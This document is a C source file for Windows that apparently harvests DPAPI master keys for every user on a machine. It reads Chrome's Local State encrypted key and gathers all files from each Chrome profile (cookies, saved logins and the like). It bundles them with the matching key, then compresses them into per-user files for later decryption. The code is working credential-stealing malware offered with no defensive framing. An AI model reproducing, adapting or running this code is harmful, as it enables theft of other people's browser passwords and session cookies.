#include "glob.h"

void deleteMasterKey(PLIST_ENTRY masterkey)
{
	PMASTERKEY_LIST entry = NULL;

	for (entry = (PMASTERKEY_LIST)masterkey->Flink; entry != (PMASTERKEY_LIST)masterkey; entry = (PMASTERKEY_LIST)entry->navigator.Flink)
	{
		((PMASTERKEY_LIST)entry->navigator.Blink)->navigator.Flink = entry->navigator.Flink;
		((PMASTERKEY_LIST)entry->navigator.Flink)->navigator.Blink = entry->navigator.Blink;
		if (entry->masterkey.guid)
			LocalFree(entry->masterkey.guid);
		if (entry->masterkey.UserName)
			LocalFree(entry->masterkey.UserName);
		if (entry->masterkey.key)
			LocalFree(entry->masterkey.key);
		if (entry->masterkey.sid)
			LocalFree(entry->masterkey.sid);
		LocalFree(entry);
	}
}
void AddData(PBYTE* data, PDWORD dwData, PBYTE buffer, DWORD dwBuffer)
{
	PBYTE temp;

	if (temp = LocalAlloc(LPTR, dwBuffer + *dwData))
	{
		RtlCopyMemory(temp, *data, *dwData);
		RtlCopyMemory(temp + *dwData, buffer, dwBuffer);
		if (*data)
			LocalFree(*data);
		*data = temp;
		*dwData += dwBuffer;
	}
}
BOOL CheckSidGuid(PLIST_ENTRY masterkey, PWSTR sid,PWSTR guid,PBYTE* data,PDWORD dwData,PWSTR *UserName)
{
	BOOL status = FALSE;
	PMASTERKEY_LIST entry;
	DWORD len;
	for (entry = (PMASTERKEY_LIST)masterkey->Flink; entry != (PMASTERKEY_LIST)masterkey; entry = (PMASTERKEY_LIST)entry->navigator.Flink)
	{
		if (sid)
		{
			if (!_wcsicmp(entry->masterkey.sid, sid))
			{
				status = TRUE;
				break;
			}
		}
		if (guid)
		{
			if (!_wcsicmp(entry->masterkey.guid, guid))
			{
				len = lstrlenW(entry->masterkey.guid) * sizeof(wchar_t);
				AddData(data, dwData, (PBYTE)&len, sizeof(DWORD));
				AddData(data, dwData, (PBYTE)entry->masterkey.guid, len);
				AddData(data, dwData, (PBYTE)&entry->masterkey.keyLen, sizeof(DWORD));
				AddData(data, dwData, entry->masterkey.key, entry->masterkey.keyLen);
				*UserName = entry->masterkey.UserName;
				status = TRUE;
				break;
			}
		}
	}
	return status;
}
BOOL GetFile(PWSTR fileName, PBYTE* buffer, PDWORD dwFile)
{
	BOOL status = FALSE;
	HANDLE hFile = NULL;
	DWORD readed;
	
	*buffer = NULL;
	hFile = CreateFileW(fileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile && hFile != INVALID_HANDLE_VALUE)
	{
		*dwFile = GetFileSize(hFile, NULL);
		if (*buffer = LocalAlloc(LPTR, *dwFile))
		{
			if (ReadFile(hFile, *buffer, *dwFile, &readed, NULL))
				status = TRUE;
		}
		CloseHandle(hFile);
	}
	return status;
}
BOOL Base64Decrypt(PBYTE dataIn, PBYTE* dataOut, PDWORD dwOut)
{
	BOOL status = FALSE;
	

	if (CryptStringToBinaryA(dataIn, 0, CRYPT_STRING_BASE64, NULL, dwOut, NULL, NULL))
	{
		if (*dataOut = LocalAlloc(LPTR, *dwOut))
		{
			if (CryptStringToBinaryA(dataIn, 0, CRYPT_STRING_BASE64, *dataOut, dwOut, NULL, NULL))
				status = TRUE;
		}
	}

	return status;
}
BOOL CheckMasterKey(PWSTR localState,PLIST_ENTRY masterkey,PBYTE* buffer,PDWORD dwBuffer,PWSTR* UserName)
{
	BOOL status = FALSE;
	PBYTE pLocalState, base64;
	DWORD dwLocalState, dwLen;
	PBYTE begin = NULL, end = NULL;
	PKULL_M_DPAPI_BLOB blob = NULL;
	const BYTE DPAPI[] = { 'D', 'P', 'A', 'P', 'I' };
	UNICODE_STRING umasterkey;
	GUID guid;

	if (GetFile(localState, &pLocalState, &dwLocalState))
	{
		if (begin = strstr(pLocalState, "\"os_crypt\":{\"encrypted_key\":\""))
		{
			begin += 29;
			if (end = strstr(begin, "\"}"))
			{
				*(begin + strlen(begin) - strlen(end)) = 0x00;

				if (Base64Decrypt(begin, &base64, &dwLen))
				{
					*(begin + strlen(begin) - strlen(end)) = '\"';
					if (RtlEqualMemory(base64, DPAPI, sizeof(DPAPI)))
					{
						RtlCopyMemory(&guid, base64 + sizeof(DPAPI) + FIELD_OFFSET(KULL_M_DPAPI_BLOB, guidMasterKey), sizeof(GUID));
						if (NT_SUCCESS(RtlStringFromGUID(&guid, &umasterkey)))
						{
							if (CheckSidGuid(masterkey, NULL, umasterkey.Buffer, buffer, dwBuffer, UserName))
							{
								AddData(buffer, dwBuffer, (PBYTE)&dwLocalState, sizeof(DWORD));
								AddData(buffer, dwBuffer, pLocalState, dwLocalState);
								status = TRUE;
							}
							RtlFreeUnicodeString(&umasterkey);
						}
					}
					LocalFree(base64);
				}
			}
		}
		LocalFree(pLocalState);
	}
	return status;
}
void WriteToFile(PWSTR fileNmae, PBYTE buffer, DWORD dwBuffer)
{
	HANDLE hFile = NULL;
	DWORD wrote;

	hFile = CreateFileW(fileNmae, GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile && hFile != INVALID_HANDLE_VALUE)
	{
		SetFilePointer(hFile, 0,NULL, FILE_BEGIN);
		SetEndOfFile(hFile);
		WriteFile(hFile, buffer, dwBuffer, &wrote, NULL);
		CloseHandle(hFile);
	}
}
void CompressData(PBYTE data, DWORD dwData,PWSTR FileName)
{
	ULONG CompressBufferWorkSpaceSize, CompressFragmentWorkSpaceSize, CompressedBufferSize, FinalCompressedSize = 0;
	NTSTATUS status;
	PUCHAR CompressedBuffer;
	PVOID workSpace;

	status = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS | COMPRESSION_ENGINE_MAXIMUM, &CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);
	if (NT_SUCCESS(status))
	{
		if (workSpace = LocalAlloc(LPTR, CompressBufferWorkSpaceSize))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			for (CompressedBufferSize = 0x10000; (status == STATUS_BUFFER_TOO_SMALL) && (CompressedBuffer = LocalAlloc(LPTR, CompressedBufferSize)); CompressedBufferSize <<= 1)
			{
				status = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS | COMPRESSION_ENGINE_MAXIMUM, data, dwData, CompressedBuffer, CompressedBufferSize, 4096, &FinalCompressedSize, workSpace);
				if (!NT_SUCCESS(status))
					LocalFree(CompressedBuffer);
			}
			if (NT_SUCCESS(status))
			{
				WriteToFile(FileName, CompressedBuffer, FinalCompressedSize);
				LocalFree(CompressedBuffer);
			}
			LocalFree(workSpace);
		}
	}
	else wprintf(L"[-] RtlGetCompressionWorkSpaceSize Failed 0x%08x\n", status);
}
void Collect(HANDLE hFile,LPWIN32_FIND_DATA pFindData,PBYTE data,DWORD dwData,PWSTR ProfilePath,PWSTR UserName,PWSTR cbFileName)
{
	wchar_t FilePath[MAX_PATH];
	wchar_t outFileName[MAX_PATH];
	DWORD len;
	PBYTE buffer;
	BOOL isFileExist = FALSE;
	PBYTE outData = NULL;
	DWORD outLen = 0;

	AddData(&outData, &outLen, data, dwData);
	do
	{
		RtlSecureZeroMemory(FilePath, sizeof(FilePath));
		if (pFindData->cFileName[0] == L'.' || (pFindData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || !_wcsicmp(L"Google Profile.ico", pFindData->cFileName))
			continue;
		len = lstrlenW(pFindData->cFileName) * sizeof(wchar_t);
		AddData(&outData, &outLen, (PBYTE)&len, sizeof(DWORD));
		AddData(&outData, &outLen, (PBYTE)pFindData->cFileName, len);
		wsprintfW(FilePath, L"%ws\\%ws", ProfilePath, pFindData->cFileName);
		
		if (GetFile(FilePath, &buffer, &len))
		{
			wprintf(L"%ws %d\n", pFindData->cFileName, len);
			AddData(&outData, &outLen, (PBYTE)&len, sizeof(DWORD));
			AddData(&outData, &outLen, buffer, len);
			isFileExist = TRUE;
			wsprintfW(outFileName, L"%ws_%ws", UserName, cbFileName);
			if (len)
				LocalFree(buffer);
		}
	} while (FindNextFileW(hFile, pFindData));

	if (isFileExist)
	{
		CompressData(outData, outLen, outFileName);
		LocalFree(outData);
	}

}
void CreatData(PWSTR Driver, PWSTR User, PLIST_ENTRY masterkey)
{
	wchar_t LocalState[MAX_PATH] = { 0 };
	wchar_t Default[MAX_PATH] = { 0 };
	wchar_t FilePath[MAX_PATH];
	wchar_t Profile[MAX_PATH];
	
	PBYTE data = NULL;
	DWORD dwData = 0;
	HANDLE hFile = NULL, hProfile = NULL;
	WIN32_FIND_DATA FindData, ProfileFindData;
	PWSTR UserName;

	wsprintfW(LocalState, L"%wsUsers\\%ws\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", Driver, User);
	wsprintfW(Default, L"%wsUsers\\%ws\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\*.*", Driver, User);
	

	if (CheckMasterKey(LocalState, masterkey, &data, &dwData,&UserName))
	{
		hFile = FindFirstFileW(Default, &FindData);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
		{
			wsprintfW(FilePath, L"%wsUsers\\%ws\\AppData\\Local\\Google\\Chrome\\User Data\\Default", Driver, User);
			
			Collect(hFile, &FindData, data, dwData, FilePath, UserName, L"Default");

			/*do
			{
				RtlSecureZeroMemory(FilePath, sizeof(FilePath));
				if (FindData.cFileName[0] == L'.' || (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || !_wcsicmp(L"Google Profile.ico", FindData.cFileName))
					continue;
				len = lstrlenW(FindData.cFileName) * sizeof(wchar_t);
				AddData(&data, &dwData, (PBYTE)&len, sizeof(DWORD));
				AddData(&data, &dwData, (PBYTE)FindData.cFileName, len);
				wsprintfW(FilePath, L"%wsUsers\\%ws\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\%ws", Driver, User, FindData.cFileName);
				wsprintfW(outFileName, L"%ws_Default", UserName);
				if (GetFile(FilePath, &buffer, &len))
				{
					AddData(&data, &dwData, (PBYTE)&len, sizeof(DWORD));
					AddData(&data, &dwData, buffer, len);
					isFileExit = TRUE;
					if(len)
						LocalFree(buffer);
				}
			} while (FindNextFileW(hFile, &FindData));*/
			CloseHandle(hFile);
		}
		else 
		{
			wsprintfW(Profile, L"%wsUsers\\%ws\\AppData\\Local\\Google\\Chrome\\User Data\\*.*", Driver, User);
			hProfile = FindFirstFileW(Profile, &FindData);
			if (hProfile && hProfile != INVALID_HANDLE_VALUE)
			{
				do
				{
					if (FindData.cFileName[0] == L'.' || !(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
						continue;
					if (StrStrIW(FindData.cFileName, L"Profile"))
					{
						wsprintfW(Default, L"%wsUsers\\%ws\\AppData\\Local\\Google\\Chrome\\User Data\\%ws\\*.*", Driver, User, FindData.cFileName);
						hFile = FindFirstFileW(Default, &ProfileFindData);

						if (hFile && hFile != INVALID_HANDLE_VALUE)
						{
							wsprintfW(FilePath, L"%wsUsers\\%ws\\AppData\\Local\\Google\\Chrome\\User Data\\%ws", Driver, User, FindData.cFileName);
							Collect(hFile, &ProfileFindData, data, dwData, FilePath, UserName, FindData.cFileName);
							CloseHandle(hFile);
						}
					}

				} while (FindNextFileW(hProfile, &FindData));
				CloseHandle(hProfile);
			}
		}

		LocalFree(data);
	}


}
void dispaly(PLIST_ENTRY masterkey)
{
	PMASTERKEY_LIST entry;
	for (entry = (PMASTERKEY_LIST)masterkey->Flink; entry != (PMASTERKEY_LIST)masterkey; entry = (PMASTERKEY_LIST)entry->navigator.Flink)
	{
		wprintf(L"%ws %ws %ws ", entry->masterkey.UserName, entry->masterkey.guid, entry->masterkey.sid);
		for (unsigned int i = 0; i < entry->masterkey.keyLen; i++)
			wprintf(L"%02x", entry->masterkey.key[i]);

		wprintf(L"\n");
	}
}
int main(int argc, char** argv)
{
	LIST_ENTRY masterkey = { &masterkey,&masterkey };
	wchar_t systemroot[20] = { 0 };
	wchar_t Driver[10] = { 0 };
	wchar_t UserDirtory[20] = { 0 };
	wchar_t sidPath[MAX_PATH];
	WIN32_FIND_DATA FindData, sidFindData;
	HANDLE hUser = NULL, hSid = NULL;

	if (GetMasterKey(&masterkey))
	{
		GetEnvironmentVariableW(L"SYSTEMROOT", systemroot, 20);
		RtlCopyMemory(Driver, systemroot, (wcslen(systemroot) - 7) * sizeof(wchar_t));
		wsprintfW(UserDirtory, L"%wsUsers\\*.*", Driver);
		hUser = FindFirstFileW(UserDirtory, &FindData);

		if (hUser != INVALID_HANDLE_VALUE && hUser)
		{
			do
			{
				RtlSecureZeroMemory(sidPath, sizeof(sidPath));
				if (FindData.cFileName[0] == L'.' || !_wcsicmp(L"desktop.ini", FindData.cFileName) || !_wcsicmp(L"All Users", FindData.cFileName) || !_wcsicmp(L"Default", FindData.cFileName) || !_wcsicmp(L"Default User", FindData.cFileName) || !_wcsicmp(L"Public", FindData.cFileName))
					continue;
				wsprintfW(sidPath, L"%wsUsers\\%ws\\AppData\\Roaming\\Microsoft\\Protect\\*.*", Driver, FindData.cFileName);
				hSid = FindFirstFileW(sidPath, &sidFindData);

				if (hSid != INVALID_HANDLE_VALUE && hSid)
				{
					do
					{
						if (sidFindData.cFileName[0] == L'.' || !_wcsicmp(L"CREDHIST", sidFindData.cFileName))
							continue;
						
						if (CheckSidGuid(&masterkey, sidFindData.cFileName, NULL, NULL, NULL, NULL))
						{
							CreatData(Driver, FindData.cFileName, &masterkey);
						}
					} while (FindNextFileW(hSid, &sidFindData));
					CloseHandle(hSid);
				}
			} while (FindNextFileW(hUser, &FindData));
			CloseHandle(hUser);
		}

		deleteMasterKey(&masterkey);
	}
	return 0;
}